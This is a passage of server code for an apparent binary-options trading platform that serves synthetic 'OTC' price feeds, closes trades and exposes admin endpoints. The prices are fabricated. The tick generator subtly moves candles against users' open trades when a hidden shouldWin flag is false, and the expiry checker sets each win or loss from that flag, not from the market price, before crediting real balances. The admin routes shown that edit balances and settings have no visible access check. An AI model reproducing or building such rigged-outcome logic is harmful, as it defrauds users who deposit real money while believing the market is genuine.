      // Get current incomplete candle from server's currentCandles
      const pair = assetId.replace('_OTC', '');
      let currentCandle: CurrentCandle | null = currentCandles[pair] || null;
      
      // ✅ Validate current candle - don't send if values are null/undefined/NaN
      if (currentCandle) {
        const isValid = typeof currentCandle.open === 'number' && 
                       typeof currentCandle.high === 'number' && 
                       typeof currentCandle.low === 'number' && 
                       typeof currentCandle.close === 'number' &&
                       !isNaN(currentCandle.open) &&
                       !isNaN(currentCandle.high) &&
                       !isNaN(currentCandle.low) &&
                       !isNaN(currentCandle.close);
        
        if (!isValid) {
          currentCandle = null; // Don't send invalid candle
        }
      }
      
      res.json({
        candles,
        currentCandle,
        candleInterval: 60 // Server uses 60-second candles
      });
    } catch (error) {
      console.error(`Error loading candles for ${assetId}:`, error);
      res.status(500).json({ message: "Failed to load candles" });
    }
  });
  
  // ✅ Generate realistic historical candles with PERSISTENT TREND (only 4 OTC assets)
  const generateHistoricalCandles = async (assetId: string, startPrice: number, count: number = 300) => {
    console.log(`📊 Generating ${count} historical candles with persistent trend for ${assetId}...`);
    
    const candles: any[] = [];
    const candleInterval = 60; // 60 seconds per candle
    const now = Math.floor(Date.now() / 1000);
    
    let price = startPrice;
    
    // Determine volatility by asset type (only 4 assets)
    let volatility = 0.0001;
    if (assetId.includes('BTC')) {
      volatility = 0.002; // Bitcoin: moderate volatility
    } else if (assetId.includes('GOLD')) {
      volatility = 0.0015; // Gold: low volatility
    } else {
      volatility = 0.0008; // Forex: very low volatility
    }
    
    // 🎯 PERSISTENT TREND: Generate 3-5 trend periods to create realistic chart
    const trendPeriods = 3 + Math.floor(Math.random() * 3); // 3-5 periods
    const candlesPerPeriod = Math.floor(count / trendPeriods);
    
    let candleIndex = 0;
    
    for (let period = 0; period < trendPeriods; period++) {
      // Each period has a consistent trend direction
      const trendDirection = Math.random() > 0.5 ? 1 : -1; // Up or Down
      const trendStrength = 0.0003 + Math.random() * 0.0007; // 0.03% to 0.1% per candle
      const periodCandles = period === trendPeriods - 1 
        ? count - candleIndex  // Last period gets remaining candles
        : candlesPerPeriod;
      
      console.log(`  Period ${period + 1}/${trendPeriods}: ${periodCandles} candles, trend: ${trendDirection > 0 ? 'UP ⬆️' : 'DOWN ⬇️'}`);
      
      for (let i = 0; i < periodCandles && candleIndex < count; i++, candleIndex++) {
        const timestamp = new Date((now - ((count - candleIndex - 1) * candleInterval)) * 1000);
        
        // Apply consistent trend with small random noise
        const open = price;
        const trendMove = trendDirection * trendStrength * open;
        const noise = (Math.random() - 0.5) * volatility * open * 0.5;
        const close = open + trendMove + noise;
        
        // High/Low with realistic wicks
        const wickSize = Math.abs(close - open) * (0.5 + Math.random() * 1.5);
        const high = Math.max(open, close) + wickSize * Math.random() * 0.6;
        const low = Math.min(open, close) - wickSize * Math.random() * 0.6;
        
        // Determine decimals
        let decimals = 5; // Default for Forex
        if (assetId.includes('BTC') || assetId.includes('GOLD')) decimals = 2;
        
        candles.push({
          assetId,
          timestamp,
          open: parseFloat(open.toFixed(decimals)).toString(),
          high: parseFloat(high.toFixed(decimals)).toString(),
          low: parseFloat(low.toFixed(decimals)).toString(),
          close: parseFloat(close.toFixed(decimals)).toString(),
          volume: (50000 + Math.random() * 100000).toString()
        });
        
        price = close;
      }
    }
    
    console.log(`✅ Generated ${candles.length} candles with ${trendPeriods} trend periods`);
    return candles;
  };
  
  // ✅ 24/7 CONTINUOUS OPERATION: Initialize OTC markets with full data persistence
  storage.getAllAssets().then(async assets => {
    console.log(`\n🚀 Initializing ${assets.length} OTC markets for 24/7 operation...`);
    
    for (const asset of assets) {
      const pair = asset.id.replace('_OTC', '');
      let startPrice = parseFloat(asset.currentPrice);
      let candleCount = 0;
      
      try {
        // Check existing candles in database (check for at least 300)
        const existingCandles = await storage.getPriceData(asset.id, 300);
        candleCount = existingCandles.length;
        
        if (candleCount < 50) {
          // No data or insufficient data - generate initial 300 candles with persistent trend
          console.log(`📊 ${pair}: Only ${candleCount} candles found. Generating 300 candles with persistent trend...`);
          const historicalCandles = await generateHistoricalCandles(asset.id, startPrice, 300);
          
          // Save all candles to database
          for (const candle of historicalCandles) {
            await storage.addPriceData(candle);
          }
          
          // Use last candle's close as start price
          startPrice = parseFloat(historicalCandles[historicalCandles.length - 1].close);
          candleCount = 300;
          console.log(`✅ ${pair}: Generated 300 candles with persistent trend. Starting price: ${startPrice.toFixed(6)}`);
        } else {
          // Resume from last saved price
          startPrice = parseFloat(existingCandles[0].close);
          const lastCandleTime = new Date(existingCandles[0].timestamp);
          const minutesAgo = Math.floor((Date.now() - lastCandleTime.getTime()) / 60000);
          
          console.log(`♻️ ${pair}: Resuming from last price ${startPrice.toFixed(6)} (${candleCount} candles, ${minutesAgo} min ago)`);
        }
      } catch (error) {
        console.error(`❌ ${pair}: Error loading data:`, error);
      }
      
      // Initialize market with last known price
      otcMarkets[pair] = startPrice;
      priceMomentum[pair] = 0;
      priceHistory[pair] = [startPrice];
      
      // Initialize first candle for this session
      const currentTime = Math.floor(Date.now() / 1000);
      currentCandles[pair] = {
        pair,
        time: currentTime,
        open: startPrice,
        high: startPrice,
        low: startPrice,
        close: startPrice,
        startTime: currentTime
      };
    }
    
    // ✅ Mark markets as initialized - safe to send candles via WebSocket now
    isMarketsInitialized = true;
    
    console.log(`\n🎯 ALL ${assets.length} OTC MARKETS READY - RUNNING 24/7`);
    console.log(`📈 Markets will continue from last saved state`);
    console.log(`💾 Auto-saving candles every 60 seconds (1 minute per candle)\n`);
    
    // 🗑️ AUTO-CLEANUP: Delete data older than 2 days to prevent database overflow
    // With 38 markets × 1 candle/min = 38 candles/min = ~54,720 candles/day
    // We keep only 2 days (~109k candles) - much more efficient than 5-second candles!
    const cleanupOldData = async () => {
      try {
        const daysToKeep = 2;  // Keep only 2 days of data
        const deletedCount = await storage.cleanupOldPriceData(daysToKeep);
        
        if (deletedCount > 0) {
          console.log(`🗑️ Cleaned up ${deletedCount} old candles (older than ${daysToKeep} days)`);
        }
      } catch (error) {
        console.error('❌ Error during auto-cleanup:', error);
      }
    };
    
    // Run cleanup immediately on startup
    cleanupOldData();
    
    // Run cleanup every 2 hours (more frequent to prevent overflow)
    setInterval(cleanupOldData, 2 * 60 * 60 * 1000);
    console.log(`🗑️ Auto-cleanup enabled: keeping last 2 days of data, running every 2 hours\n`);
  });

  const generateOtcPriceUpdate = (pair: string, currentPrice: number) => {
    const currentTime = Math.floor(Date.now() / 1000);
    const last = otcMarkets[pair] || currentPrice;
    
    // Initialize if not exists
    if (!priceMomentum[pair]) priceMomentum[pair] = 0;
    if (!priceHistory[pair]) priceHistory[pair] = [last];
    
    // ✅ Determine volatility based on asset type AND time of day
    let volatility = 0.00002;
    if (pair.includes('BTC') || pair.includes('ETH') || pair.includes('LTC') || pair.includes('XRP') || pair.includes('BNB') || pair.includes('ADA')) {
      volatility = 0.0003;
    } else if (pair.includes('JPY')) {
      volatility = 0.0008;
    } else if (pair.includes('GOLD') || pair.includes('SILVER') || pair.includes('OIL')) {
      volatility = 0.0003;
    } else if (pair.includes('SPX') || pair.includes('NDX') || pair.includes('DJI') || pair.includes('DAX') || pair.includes('CAC') || pair.includes('FTSE') || pair.includes('NIKKEI')) {
      volatility = 0.0003;
    }
    
    // ✅ Time-based volatility (trading session simulation)
    const hour = new Date().getHours();
    let timeMultiplier = 1.0;
    
    // London/NY sessions (higher volatility)
    if ((hour >= 8 && hour <= 12) || (hour >= 13 && hour <= 17)) {
      timeMultiplier = 1.5;
    } 
    // Asian session (medium volatility)
    else if (hour >= 1 && hour <= 7) {
      timeMultiplier = 1.2;
    } 
    // Off-hours (lower volatility)
    else {
      timeMultiplier = 0.7;
    }
    
    volatility *= timeMultiplier;
    
    // Check for active trades on this pair to manipulate candles subtly
    let candleManipulation = 0;
    activeTrades.forEach(trade => {
      const tradePair = trade.assetId.replace('_OTC', '');
      if (tradePair === pair) {
        const timeRemaining = trade.expiryTime - Date.now();
        
        if (timeRemaining <= 25000 && timeRemaining > 0) {
          const timeProgress = (25000 - timeRemaining) / 25000;
          const candleStrength = 0.3 + (timeProgress * 0.5); // Reduced strength
          
          if (!trade.shouldWin) {
            if (trade.type === 'CALL') {
              candleManipulation -= volatility * candleStrength * 0.3; // Reduced manipulation
            } else {
              candleManipulation += volatility * candleStrength * 0.3;
            }
          } else {
            if (trade.type === 'CALL') {
              candleManipulation += volatility * candleStrength * 0.15; // Very subtle
            } else {
              candleManipulation -= volatility * candleStrength * 0.15;
            }
          }
        }
      }
    });
    
    // Realistic price movement with strong mean reversion
    const history = priceHistory[pair];
    const recentAvg = history.slice(-20).reduce((a, b) => a + b, 0) / Math.min(20, history.length);
    
    // Strong mean reversion force (price strongly tends to return to average)
    const meanReversionForce = (recentAvg - last) * 0.08;
    
    // Random walk component (very small for natural micro-movements)
    const randomWalk = (Math.random() - 0.5) * volatility * last * 0.5;
    
    // Momentum persistence (80% decay for smoother movement)
    const momentumDecay = 0.8;
    const newMomentum = priceMomentum[pair] * momentumDecay + randomWalk * 0.2;
    priceMomentum[pair] = newMomentum;
    
    // Combine all forces for natural movement
    const totalChange = newMomentum + meanReversionForce + (candleManipulation * last);
    const newPrice = last + totalChange;
    
    // Update price and history
    otcMarkets[pair] = newPrice;
    priceHistory[pair].push(newPrice);
    if (priceHistory[pair].length > 50) {
      priceHistory[pair].shift(); // Keep only recent history
    }

    // Return price tick data (client will build candles)
    return {
      pair,
      time: currentTime,
      price: newPrice
    };
  };

  // Send price updates every second (client builds candles based on their interval)
  setInterval(async () => {
    const assets = await storage.getAllAssets();
    
    assets.forEach(asset => {
      const pair = asset.id.replace('_OTC', '');
      const currentPrice = parseFloat(asset.currentPrice);
      const priceUpdate = generateOtcPriceUpdate(pair, currentPrice);
      
      const message = JSON.stringify({
        type: 'otc_price_tick',
        data: priceUpdate
      });
      
      connectedClients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(message);
        }
      });
      
      // Update current candle for this pair
      const currentTime = Math.floor(Date.now() / 1000);
      if (!currentCandles[pair]) {
        currentCandles[pair] = {
          pair,
          time: currentTime,
          open: priceUpdate.price,
          high: priceUpdate.price,
          low: priceUpdate.price,
          close: priceUpdate.price,
          startTime: currentTime
        };
      } else {
        currentCandles[pair].close = priceUpdate.price;
        currentCandles[pair].high = Math.max(currentCandles[pair].high, priceUpdate.price);
        currentCandles[pair].low = Math.min(currentCandles[pair].low, priceUpdate.price);
      }
    });
  }, 1000); // Update every second for smooth price movement

  // Track saved candles to avoid duplicates
  const savedCandleTimestamps: Record<string, number> = {};

  // Save and update candles to database every 5 seconds
  setInterval(async () => {
    const assets = await storage.getAllAssets();
    const currentTime = Math.floor(Date.now() / 1000);
    
    for (const asset of assets) {
      const pair = asset.id.replace('_OTC', '');
      const candle = currentCandles[pair];
      
      if (candle) {
        try {
          const candleKey = `${pair}_${candle.startTime}`;
          const candleTimestamp = new Date(candle.startTime * 1000);
          
          // Check if this candle was already saved
          if (!savedCandleTimestamps[candleKey]) {
            // First time saving this candle - add to database
            await storage.addPriceData({
              assetId: asset.id,
              timestamp: candleTimestamp,
              open: candle.open.toString(),
              high: candle.high.toString(),
              low: candle.low.toString(),
              close: candle.close.toString(),
              volume: "0"
            });
            
            savedCandleTimestamps[candleKey] = candle.startTime;
          } else {
            // Candle already saved - update it with latest high/low/close
            await storage.updatePriceData(
              asset.id,
              candleTimestamp,
              candle.high.toString(),
              candle.low.toString(),
              candle.close.toString()
            );
          }
          
          // Start new candle every 60 seconds (1 minute)
          const elapsedTime = currentTime - candle.startTime;
          if (elapsedTime >= 60) {
            currentCandles[pair] = {
              pair,
              time: currentTime,
              open: candle.close,
              high: candle.close,
              low: candle.close,
              close: candle.close,
              startTime: currentTime
            };
            
            // Clean up old timestamps (keep only last 100 per pair)
            const pairKeys = Object.keys(savedCandleTimestamps).filter(k => k.startsWith(pair + '_'));
            if (pairKeys.length > 100) {
              const oldestKeys = pairKeys.slice(0, pairKeys.length - 100);
              oldestKeys.forEach(key => delete savedCandleTimestamps[key]);
            }
          }
        } catch (error) {
          console.error(`Error saving/updating candle for ${pair}:`, error);
        }
      }
    }
  }, 1000); // Save/update every 1 second (real-time) to prevent any data loss

  // Track closed trades to avoid duplicate closures
  const closedTrades = new Set<string>();
  
  // Trade expiry checker
  const checkTradeExpiry = async () => {
    try {
      const now = new Date();
      
      // Get all open trades from database
      const allOpenTrades = await storage.getAllTrades();
      const openTrades = allOpenTrades.filter((t: Trade) => t.status === 'open');
      
      for (const trade of openTrades) {
        // Skip if already processed
        if (closedTrades.has(trade.id)) {
          continue;
        }
        
        const expiryTime = new Date(trade.expiryTime).getTime();
        
        if (now.getTime() >= expiryTime) {
          // Mark as closed to prevent duplicate processing
          closedTrades.add(trade.id);
          
          const user = await storage.getUser(trade.userId);
          if (!user) {
            continue;
          }
          
          const asset = await storage.getAsset(trade.assetId);
          const closePrice = asset?.currentPrice || trade.openPrice;
          
          let status: string;
          let payout: string;
          
          if (trade.shouldWin) {
            // Force win - payout is original amount + 92% profit = 1.92x
            status = 'won';
            payout = (parseFloat(trade.amount) * 1.92).toString();
          } else {
            status = 'lost';
            payout = '0';
          }
          
          await storage.updateTrade(trade.id, closePrice, status, payout);
          
          if (status === 'won' && payout !== '0') {
            const payoutAmount = parseFloat(payout);
            if (trade.isDemo) {
              const newDemoBalance = (parseFloat(user.demoBalance || "0") + payoutAmount).toFixed(2);
              await storage.updateUserBalance(trade.userId, newDemoBalance, user.realBalance || "0.00");
            } else {
              const newRealBalance = (parseFloat(user.realBalance || "0") + payoutAmount).toFixed(2);
              await storage.updateUserBalance(trade.userId, user.demoBalance || "10000.00", newRealBalance);
            }
          }
          
          activeTrades.delete(trade.id);
          console.log(`Trade ${trade.id} auto-closed: ${status} (shouldWin: ${trade.shouldWin}), payout: ${payout}`);
          
          // Clean up closed trades set periodically (keep last 1000)
          if (closedTrades.size > 1000) {
            const toDelete = Array.from(closedTrades).slice(0, 500);
            toDelete.forEach(id => closedTrades.delete(id));
          }
        }
      }
    } catch (error) {
      console.error('Error checking trade expiry:', error);
    }
  };

  setInterval(checkTradeExpiry, 1000); // Check every second

  // Admin routes
  app.get("/api/admin/users", async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      res.json(users);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch users" });
    }
  });

  app.get("/api/admin/deposits", async (req, res) => {
    try {
      const deposits = await storage.getAllDeposits();
      res.json(deposits);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch deposits" });
    }
  });

  app.get("/api/admin/trades", async (req, res) => {
    try {
      const trades = await storage.getAllTrades();
      res.json(trades);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch trades" });
    }
  });

  const updateBalanceSchema = z.object({
    demoBalance: z.string(),
    realBalance: z.string()
  });

  app.patch("/api/admin/users/:id/balance", async (req, res) => {
    try {
      const { demoBalance, realBalance } = updateBalanceSchema.parse(req.body);
      const user = await storage.updateUserBalance(req.params.id, demoBalance, realBalance);
      
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      res.json(user);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid balance data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to update balance" });
    }
  });

  app.get("/api/admin/stats", async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      const deposits = await storage.getAllDeposits();
      const trades = await storage.getAllTrades();
      const withdrawals = await storage.getAllWithdrawals();

      const totalUsers = users.length;
      const totalDeposits = deposits.reduce((sum, d) => sum + parseFloat(d.amount), 0);
      const pendingDeposits = deposits.filter(d => d.status === 'pending').length;
      const completedDeposits = deposits.filter(d => d.status === 'completed').length;
      
      const totalTrades = trades.length;
      const openTrades = trades.filter(t => t.status === 'open').length;
      const wonTrades = trades.filter(t => t.status === 'won').length;
      const lostTrades = trades.filter(t => t.status === 'lost').length;

      const totalTradeVolume = trades.reduce((sum, t) => sum + parseFloat(t.amount), 0);
      const totalPayout = trades.reduce((sum, t) => sum + parseFloat(t.payout || '0'), 0);

      const totalWithdrawals = withdrawals.reduce((sum, w) => sum + parseFloat(w.amount), 0);
      const pendingWithdrawals = withdrawals.filter(w => w.status === 'pending').length;
      const completedWithdrawals = withdrawals.filter(w => w.status === 'completed').length;

      res.json({
        users: {
          total: totalUsers
        },
        deposits: {
          total: totalDeposits,
          pending: pendingDeposits,
          completed: completedDeposits,
          count: deposits.length
        },
        trades: {
          total: totalTrades,
          open: openTrades,
          won: wonTrades,
          lost: lostTrades,
          volume: totalTradeVolume,
          payout: totalPayout
        },
        withdrawals: {
          total: totalWithdrawals,
          pending: pendingWithdrawals,
          completed: completedWithdrawals,
          count: withdrawals.length
        }
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch stats" });
    }
  });

  // Admin withdrawals endpoint
  app.get("/api/admin/withdrawals", async (req, res) => {
    try {
      const withdrawals = await storage.getAllWithdrawals();
      res.json(withdrawals);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch withdrawals" });
    }
  });

  // Settings routes
  app.get("/api/admin/settings", async (req, res) => {
    try {
      const settings = await storage.getSettings();
      res.json(settings);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch settings" });
    }
  });

  app.patch("/api/admin/settings", async (req, res) => {
    try {
      const validated = updateSettingsSchema.parse(req.body);
      const settings = await storage.updateSettings(validated);
      res.json(settings);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid settings data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to update settings" });
    }
  });

  return httpServer;
}
